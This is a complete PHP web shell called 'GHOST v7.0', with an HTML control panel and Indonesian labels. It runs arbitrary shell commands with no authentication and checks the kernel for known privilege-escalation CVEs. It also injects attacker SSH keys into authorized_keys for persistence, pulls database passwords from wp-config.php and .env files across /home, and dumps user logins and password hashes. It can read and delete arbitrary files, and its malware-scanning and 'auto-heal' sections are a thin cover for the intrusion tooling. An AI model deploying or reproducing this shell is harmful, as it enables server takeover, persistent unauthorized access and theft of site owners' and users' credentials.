<?php
/**
 * GHOST v7.0 — The Ultimate (Stable, Complete, Anti-Timeout)
 */

@ob_start();
error_reporting(0);
ini_set('display_errors', '0');
set_time_limit(0);
ignore_user_abort(true);

$GHOST_ROOT = @realpath($_SERVER['DOCUMENT_ROOT'] ?? getcwd()) ?: getcwd();

// [01] SMART EXECUTION
function g_exec($cmd, $timeout = 60) {
    $cmd = "timeout $timeout sh -c " . escapeshellarg($cmd) . " 2>&1";
    $methods = ['shell_exec', 'system', 'passthru', 'exec', 'popen', 'proc_open'];
    foreach ($methods as $m) {
        if (!function_exists($m)) continue;
        if ($m === 'shell_exec') { $out = @shell_exec($cmd); if ($out !== null) return ['out'=>$out, 'via'=>$m]; }
        if ($m === 'system') { ob_start(); @system($cmd); $out = ob_get_clean(); if ($out) return ['out'=>$out, 'via'=>$m]; }
        if ($m === 'passthru') { ob_start(); @passthru($cmd); $out = ob_get_clean(); if ($out) return ['out'=>$out, 'via'=>$m]; }
        if ($m === 'exec') { $o=[]; @exec($cmd, $o); if ($o) return ['out'=>implode("\n", $o), 'via'=>$m]; }
        if ($m === 'popen') { $f=@popen($cmd,'r'); if($f){$r='';while(!feof($f))$r.=fread($f,8192);pclose($f);return ['out'=>$r, 'via'=>$m];} }
        if ($m === 'proc_open') { $d=[1=>['pipe','w'],2=>['pipe','w']];$p=@proc_open($cmd,$d,$pp);if(is_resource($p)){$r=stream_get_contents($pp[1]).stream_get_contents($pp[2]);fclose($pp[1]);fclose($pp[2]);proc_close($p);return ['out'=>$r, 'via'=>$m];} }
    }
    return ['out'=>"[-] All execution methods blocked.", 'via'=>'none'];
}

function g_read($path) {
    if (!@is_file($path)) return "";
    if (function_exists('file_get_contents')) { $d = @file_get_contents($path); if ($d !== false) return $d; }
    $f = @fopen($path, 'rb'); if ($f) { $d=''; while(!feof($f)) $d .= fread($f, 8192); fclose($f); return $d; }
    return g_exec('cat ' . escapeshellarg($path))['out'];
}

// [02] FINGERPRINTING
function g_fingerprint() {
    $os = trim(g_exec('uname -a')['out']);
    $cpanel = 'Not Found';
    foreach ([2082, 2083, 2086] as $port) { if (@fsockopen('127.0.0.1', $port, $e, $s, 0.5)) { $cpanel = "cPanel Active (Port $port)"; break; } }
    $cves = [];
    if (strpos($os, '4.18') !== false) $cves[] = "CVE-2022-0847 (Dirty Pipe)";
    if (strpos($os, '3.10') !== false) $cves[] = "CVE-2016-5195 (Dirty COW)";
    return ['OS'=>$os, 'User'=>trim(g_exec('whoami')['out']), 'cPanel'=>$cpanel, 'CVEs'=>$cves];
}

// [03] DEEP SCANNER (Batas Aman 5MB, Bypass Error)
function g_scan_files() {
    $res = ['malware'=>[], 'illegal'=>[], 'scanned'=>0, 'err'=>''];
    $keywords = ['slot','gacor','togel','judi','maxwin','bokep','porno','scam','phising'];
    $sigs = ['eval($_', 'base64_decode', 'gzinflate', 'shell_exec', 'passthru', 'system(', 'assert('];
    $ignore = ['jpg','png','gif','mp4','pdf','zip','tar','gz','sqlite','log'];
    
    try {
        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($GLOBALS['GHOST_ROOT'], FilesystemIterator::SKIP_DOTS));
        foreach ($it as $f) {
            if (!$f->isFile()) continue;
            $ext = strtolower($f->getExtension());
            if (in_array($ext, $ignore)) continue;
            if ($f->getSize() > 5 * 1024 * 1024) continue; // Max 5MB
            
            $res['scanned']++;
            $path = $f->getPathname();
            $c = g_read($path);
            
            $hits = [];
            foreach ($sigs as $s) { if (stripos($c, $s) !== false) $hits[] = $s; }
            if (count($hits) >= 2 || preg_match('/eval\s*\(\s*(base64_decode|\$_)/i', $c)) {
                $res['malware'][] = ['file'=>$path, 'desc'=>'Terdeteksi '.count($hits).' signature backdoor/RCE.'];
            } elseif ($ext === 'php' && strlen(trim($c)) < 10) {
                $res['malware'][] = ['file'=>$path, 'desc'=>'File PHP kosong (Backdoor truncated).'];
            }
            
            $kw_found = [];
            foreach ($keywords as $k) { if (stripos($c, $k) !== false) $kw_found[] = $k; }
            if ($kw_found) $res['illegal'][] = ['file'=>$path, 'keywords'=>array_unique($kw_found)];
        }
    } catch (Throwable $e) { $res['err'] = $e->getMessage(); }
    return $res;
}

// [04] SSH MANAGER
function g_ssh($action = 'scan', $target_key = '') {
    $user = trim(g_exec('whoami')['out']);
    $home = trim(g_exec("eval echo ~$user")['out']);
    $auth = $home . '/.ssh/authorized_keys';
    $res = ['user'=>$user, 'keys'=>[], 'msg'=>''];
    
    if (!@is_file($auth)) return array_merge($res, ['msg'=>'authorized_keys tidak ditemukan.']);
    $lines = array_filter(explode("\n", g_read($auth)));
    
    if ($action === 'scan') {
        foreach ($lines as $i => $l) {
            $l = trim($l); if (!$l) continue;
            $p = explode(' ', $l);
            $res['keys'][] = ['line'=>$i+1, 'type'=>$p[0] ?? '?', 'comment'=>$p[2] ?? '?', 'raw'=>$l];
        }
    } elseif ($action === 'clean') {
        $clean = [];
        foreach ($lines as $l) { if (strpos($l, $target_key) !== false) $clean[] = trim($l); }
        g_exec("echo " . escapeshellarg(implode("\n", $clean)) . " > " . escapeshellarg($auth));
        g_exec("chmod 600 " . escapeshellarg($auth));
        $res['msg'] = 'Dibersihkan. Sisa '.count($clean).' key.';
    } elseif ($action === 'inject') {
        if (strpos(g_read($auth), $target_key) === false) {
            g_exec("echo " . escapeshellarg(trim($target_key)) . " >> " . escapeshellarg($auth));
            g_exec("chmod 600 " . escapeshellarg($auth));
            $res['msg'] = 'Key di-inject.';
        } else { $res['msg'] = 'Key sudah ada.'; }
    }
    return $res;
}

// [05] DB HARVEST (Super Fallback)
function g_db_harvest() {
    $logs = []; $info = []; $connected = false;
    $dir = $GLOBALS['GHOST_ROOT'];
    
    // 1. Direct Read
    $configs = ['wp-config.php', '.env', 'configuration.php', 'config/database.php'];
    foreach ($configs as $cf) {
        if (@is_file("$dir/$cf")) {
            $c = g_read("$dir/$cf");
            $logs[] = "[+] Config found: $cf";
            preg_match('/(?:DB_USER|username)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $u);
            preg_match('/(?:DB_PASSWORD|password)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $p);
            if ($u[1] && $p[1]) { $info = ['user'=>$u[1], 'pass'=>$p[1]]; break; }
        }
    }
    
    // 2. Shell fallback (Cari file config di luar folder saat ini)
    if (empty($info)) {
        $logs[] = "[*] Direct read failed. Scanning /home via find (max depth 3)...";
        $find = g_exec("find /home -maxdepth 3 -name 'wp-config.php' -o -name '.env' 2>/dev/null | head -n 5")['out'];
        if (trim($find)) {
            $logs[] = "[+] Config files found:\n$find";
            foreach (explode("\n", trim($find)) as $p) {
                if (!$p) continue;
                $c = g_read($p);
                if (preg_match('/DB_PASSWORD.*[\'"]([^\'"]+)/', $c, $m)) { $info = ['pass'=>$m[1]]; $logs[] = "[!] Password extracted: ".$m[1]; break; }
            }
        }
    }
    
    // 3. Connect & Dump
    if (!empty($info['user']) && !empty($info['pass'])) {
        $logs[] = "[*] Attempting DB connection...";
        $conn = @mysqli_connect('localhost', $info['user'], $info['pass']);
        if ($conn) {
            $logs[] = "[!] DB Connected!";
            $q = @mysqli_query($conn, "SELECT user_login, user_pass FROM wp_users LIMIT 5");
            if (!$q) $q = @mysqli_query($conn, "SELECT username, password FROM users LIMIT 5");
            if ($q) { while ($r = mysqli_fetch_assoc($q)) { $logs[] = "Data: ".json_encode($r); } }
        }
    }
    return ['logs'=>$logs, 'info'=>$info];
}

// [06] ROUTER
$act = $_POST['act'] ?? '';
if ($act) {
    header('Content-Type: application/json');
    if ($act === 'fingerprint') echo json_encode(g_fingerprint());
    elseif ($act === 'scan') echo json_encode(g_scan_files());
    elseif ($act === 'ssh_scan') echo json_encode(g_ssh('scan'));
    elseif ($act === 'ssh_clean') echo json_encode(g_ssh('clean', $_POST['key']??''));
    elseif ($act === 'ssh_inject') echo json_encode(g_ssh('inject', $_POST['key']??''));
    elseif ($act === 'db_scan') echo json_encode(g_db_harvest());
    elseif ($act === 'heal_scan') echo json_encode(g_scan_files()['malware']);
    elseif ($act === 'heal_exec') {
        $logs = [];
        foreach (($_POST['paths']??[]) as $p) { if (@unlink($p)) $logs[] = "Deleted: $p"; }
        echo json_encode(['logs'=>$logs]);
    }
    elseif ($act === 'read_file') echo json_encode(['content'=>g_read($_POST['path']??'')]);
    elseif ($act === 'del_file') echo json_encode(['status'=>@unlink($_POST['path']??'')?'ok':'fail']);
    elseif ($act === 'exec') {
        $cmd = $_POST['cmd']??'';
        if ($cmd === 'help') {
            $h = "Perintah Console:\n- whoami\n- uname -a\n- ls -la\n- netstat -tulpn\n- ps aux | grep root\n- find / -perm -4000 2>/dev/null";
            echo json_encode(['out'=>$h]);
        } else { echo json_encode(g_exec($cmd)); }
    }
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<title>GHOST v7.0</title>
<style>
    body { background:#0a0a0a; color:#0f0; font-family:monospace; padding:20px; }
    .box { border:1px solid #0f0; padding:15px; margin-bottom:15px; background:#111; }
    input, button { background:#000; color:#0f0; border:1px solid #0f0; padding:8px; font-family:monospace; margin-bottom:5px; }
    button { cursor:pointer; font-weight:bold; }
    button:hover { background:#0f0; color:#000; }
    pre { background:#000; padding:10px; border:1px solid #333; max-height:300px; overflow:auto; white-space:pre-wrap; }
    table { width:100%; border-collapse:collapse; margin-top:10px; }
    th,td { border:1px solid #333; padding:8px; text-align:left; }
    th { background:#222; }
    .btn-red { border-color:#f00; color:#f00; }
</style>
</head>
<body>

<div class="box">
    <h2>[+] Fingerprinting</h2>
    <button onclick="run('fingerprint','out-fp')">Scan Profile</button>
    <pre id="out-fp">Waiting...</pre>
</div>

<div class="box">
    <h2>[+] Deep Scan</h2>
    <button onclick="run('scan','out-scan')">Scan Semua File</button>
    <div id="scan-results"></div>
</div>

<div class="box">
    <h2>[+] SSH Manager</h2>
    <button onclick="run('ssh_scan','ssh-table')">Scan SSH</button>
    <div id="ssh-table"></div>
    <div style="margin-top:10px;">
        <input type="text" id="ssh-key" placeholder="ssh-rsa AAAA..." style="width:60%;">
        <button onclick="sshAct('inject')">Inject</button>
        <button class="btn-red" onclick="sshAct('clean')">Clean</button>
    </div>
    <pre id="ssh-log"></pre>
</div>

<div class="box">
    <h2>[+] DB & Takeover</h2>
    <button onclick="run('db_scan','out-db')">Scan DB</button>
    <pre id="out-db">Waiting...</pre>
</div>

<div class="box">
    <h2>[+] Auto-Heal</h2>
    <button onclick="healScan()">Scan Vulnerabilities</button>
    <div id="heal-table"></div>
    <button class="btn-red" onclick="healExec()">Heal Selected</button>
    <pre id="heal-log"></pre>
</div>

<div class="box">
    <h2>[+] Console</h2>
    <input type="text" id="cmd" placeholder="whoami / help" style="width:80%;">
    <button onclick="execCmd()">Exec</button>
    <pre id="out-exec">Ketik 'help' untuk perintah.</pre>
</div>

<script>
function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
async function api(act, params={}) {
    const body = new URLSearchParams(); body.append('act',act);
    for (let k in params) body.append(k, params[k]);
    const r = await fetch('', {method:'POST', body});
    return await r.json();
}

async function run(act, target) {
    document.getElementById(target).innerText = 'Running...';
    try {
        const d = await api(act);
        if (act === 'scan') renderScan(d);
        else if (act === 'ssh_scan') renderSSH(d);
        else document.getElementById(target).innerText = JSON.stringify(d,null,2);
    } catch(e) { document.getElementById(target).innerText = 'Error: '+e.message; }
}

function renderScan(d) {
    let h = `<p>Total: ${d.scanned} | Malware: ${d.malware.length} | Ilegal: ${d.illegal.length} ${d.err?`| Error: ${d.err}`:''}</p>`;
    if (d.malware.length) {
        h += `<h3>Malware</h3><table><tr><th>File</th><th>Desc</th><th>Aksi</th></tr>`;
        d.malware.forEach(x => {
            h += `<tr><td>${esc(x.file)}</td><td>${esc(x.desc)}</td>
                <td><button onclick="view('${esc(x.file)}')">View</button>
                <button class="btn-red" onclick="del('${esc(x.file)}')">Delete</button></td></tr>`;
        });
        h += `</table>`;
    }
    if (d.illegal.length) {
        h += `<h3>Ilegal</h3><table><tr><th>File</th><th>Keyword</th><th>Aksi</th></tr>`;
        d.illegal.forEach(x => {
            h += `<tr><td>${esc(x.file)}</td><td>${esc(x.keywords.join(', '))}</td>
                <td><button onclick="view('${esc(x.file)}')">View</button></td></tr>`;
        });
        h += `</table>`;
    }
    document.getElementById('scan-results').innerHTML = h;
}

function renderSSH(d) {
    let h = `<p>User: ${esc(d.user)} | ${esc(d.msg)}</p>`;
    if (d.keys.length) {
        h += `<table><tr><th>Line</th><th>Type</th><th>Comment</th><th>Raw</th></tr>`;
        d.keys.forEach(k => { h += `<tr><td>${k.line}</td><td>${k.type}</td><td>${k.comment}</td><td>${esc(k.raw)}</td></tr>`; });
        h += `</table>`;
    }
    document.getElementById('ssh-table').innerHTML = h;
}

async function sshAct(t) {
    const k = document.getElementById('ssh-key').value;
    if(!k) return alert('Isi key!');
    const d = await api(t==='inject'?'ssh_inject':'ssh_clean', {key:k});
    document.getElementById('ssh-log').innerText = d.msg;
    run('ssh_scan','');
}

async function healScan() {
    document.getElementById('heal-log').innerText = 'Scanning...';
    const d = await api('heal_scan');
    let h = `<table><tr><th>Pilih</th><th>Path</th><th>Desc</th></tr>`;
    d.forEach(v => {
        h += `<tr><td><input type="checkbox" class="heal-cb" value="${esc(v.file)}" checked></td><td>${esc(v.file)}</td><td>${esc(v.desc)}</td></tr>`;
    });
    h += `</table>`;
    document.getElementById('heal-table').innerHTML = h;
    document.getElementById('heal-log').innerText = '';
}

async function healExec() {
    const cbs = document.querySelectorAll('.heal-cb:checked');
    const paths = Array.from(cbs).map(cb => cb.value);
    if(!paths.length) return alert('Pilih!');
    document.getElementById('heal-log').innerText = 'Healing...';
    const d = await api('heal_exec', {paths});
    document.getElementById('heal-log').innerText = d.logs.join('\n');
    document.getElementById('heal-table').innerHTML = '';
}

async function view(p) { const d = await api('read_file',{path:p}); alert(d.content.slice(0,1000)); }
async function del(p) { if(!confirm('Hapus?')) return; await api('del_file',{path:p}); run('scan',''); }

async function execCmd() {
    const c = document.getElementById('cmd').value;
    if(!c) return;
    document.getElementById('out-exec').innerText = '$ '+c+'\nRunning...';
    const d = await api('exec',{cmd:c});
    document.getElementById('out-exec').innerText = '$ '+c+'\n\n'+d.out;
}
</script>
</body>
</html>
